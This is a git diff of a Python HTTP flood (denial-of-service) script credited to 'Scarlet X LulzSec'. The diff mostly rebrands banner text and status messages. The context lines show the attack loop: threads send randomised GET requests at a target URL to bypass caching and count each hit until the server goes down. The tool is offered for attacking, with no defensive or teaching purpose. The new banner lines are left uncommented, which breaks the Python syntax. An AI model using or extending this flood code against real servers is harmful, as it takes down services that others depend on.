@@ -3,9 +3,11 @@ import requests
 import threading
 import random
 
-print("Join Discord: https://discord.gg/guckproject")
-print("Author: Scarlet X LulzSecX666")
-print("Thanks To: Scarlet, Galvin, Tron, Regenxys")
+#######################################################
+Join Discord: https://discord.gg/guckproject
+Author: Scarlet X LulzSec
+Note: Dont Abuse!! This script is monitored by LulzSec
+#######################################################
 
 if os.name == 'nt':
     os.system("cls")
@@ -59,7 +61,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0} ScarletDDoS Sent".format(count))
+                print ("{0} LulzSec Sending!!".format(count))
             except requests.exceptions.ConnectionError:
                 print ("[Server might be down!]")
                 pass
